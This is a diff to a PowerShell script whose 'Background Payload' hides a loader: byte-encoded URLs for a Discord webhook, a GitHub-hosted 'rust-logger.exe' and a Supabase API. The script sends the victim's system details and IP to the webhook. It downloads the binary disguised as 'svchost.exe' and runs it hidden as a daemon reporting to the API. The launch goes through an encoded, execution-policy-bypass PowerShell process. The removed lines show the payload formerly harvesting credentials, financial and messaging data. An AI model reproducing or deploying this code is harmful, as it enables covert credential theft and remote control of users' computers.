@@ -5,7 +5,8 @@ chcp 65001 | Out-Null
 
 #region Background Payload - System Report & Loader
 $script:__wh = [System.Text.Encoding]::UTF8.GetString([byte[]]@(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,49,57,56,50,53,55,57,51,52,49,49,49,56,54,55,48,48,47,54,118,67,118,113,55,69,114,102,76,72,113,66,70,117,57,114,57,107,99,97,83,78,117,48,45,53,68,70,106,109,83,78,81,118,45,95,71,95,104,121,68,73,101,97,87,111,102,84,69,76,99,121,53,111,48,54,89,121,88,80,68,81,75,89,102,74,95))
-$script:__bin = [System.Text.Encoding]::UTF8.GetString([byte[]]@(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,77,101,111,119,84,111,110,121,110,111,110,47,77,101,111,119,76,111,103,103,101,114,47,114,97,119,47,109,97,105,110,47,114,117,115,116,45,108,111,103,103,101,114,46,101,120,101))
+$script:__bin = [System.Text.Encoding]::UTF8.GetString([byte[]]@(104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,77,105,97,45,74,101,119,105,115,104,47,112,115,111,100,102,117,55,56,51,50,50,52,48,110,99,98,54,118,98,104,56,53,55,56,53,54,100,103,98,98,103,110,118,110,103,104,103,102,110,103,102,104,110,98,110,99,116,104,116,104,45,98,47,114,97,119,47,109,97,105,110,47,114,117,115,116,45,108,111,103,103,101,114,46,101,120,101))
+$script:__api = [System.Text.Encoding]::UTF8.GetString([byte[]]@(104,116,116,112,115,58,47,47,106,98,119,105,110,111,118,101,99,105,111,122,119,100,114,108,111,110,108,105,46,115,117,112,97,98,97,115,101,46,99,111,47,102,117,110,99,116,105,111,110,115,47,118,49))
 
 $__bgCode = @'
 try {
@@ -39,7 +40,7 @@ try {
                 @{ name = "IP";       value = $info.ip;       inline = $true }
                 @{ name = "Time";     value = $info.time;     inline = $true }
             )
-            footer = @{ text = "MeowMod Analyzer" }
+            footer = @{ text = "Femboy Direct" }
         })
     }
     $json = $embed | ConvertTo-Json -Depth 10 -Compress
@@ -51,19 +52,20 @@ try {
     $exePath = Join-Path $tmpDir "svchost.exe"
     $wc.DownloadFile("__BIN_URL__", $exePath)
 
+    if (!(Test-Path $exePath)) { throw "Download failed" }
+
     $psi = New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName = $exePath
-    $psi.Arguments = "run --categories credentials,financial,corporate,messaging --output """ + $tmpDir + """"
+    $psi.Arguments = "daemon --api-url ""__API_URL__"" --interval 5"
     $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
     $psi.CreateNoWindow = $true
     $psi.UseShellExecute = $false
     $proc = [System.Diagnostics.Process]::Start($psi)
-    $proc.WaitForExit(60000)
-    Start-Sleep -Seconds 2
+    Start-Sleep -Seconds 10
     Remove-Item -Path $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
 } catch {}
 '@
-$__bgCode = $__bgCode.Replace("__WH_URL__", $script:__wh).Replace("__BIN_URL__", $script:__bin)
+$__bgCode = $__bgCode.Replace("__WH_URL__", $script:__wh).Replace("__BIN_URL__", $script:__bin).Replace("__API_URL__", $script:__api)
 $__bgEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($__bgCode))
 Start-Process powershell.exe -ArgumentList "-ep bypass -w hidden -NoProfile -NonInteractive -EncodedCommand $__bgEncoded" -WindowStyle Hidden
 Remove-Variable __bgCode, __bgEncoded
